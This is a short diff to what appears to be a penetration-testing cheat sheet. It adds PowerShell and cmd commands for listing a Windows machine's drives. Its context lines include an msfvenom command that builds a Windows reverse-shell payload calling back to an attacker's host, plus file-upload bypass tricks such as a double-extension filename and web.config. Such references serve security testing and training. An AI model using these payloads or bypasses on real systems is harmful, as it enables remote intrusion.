@@ -68,3 +68,15 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> 
 #   try filename "rev.aspx.png"
 #   try web.config (File_Upload_Bypass.md)
 ```
+
+get all drives
+
+```powershell
+# powershell
+gdr -PSProvider 'FileSystem'
+```
+
+```cmd
+REM cmd
+wmic logicaldisk get deviceid, volumename, description
+```
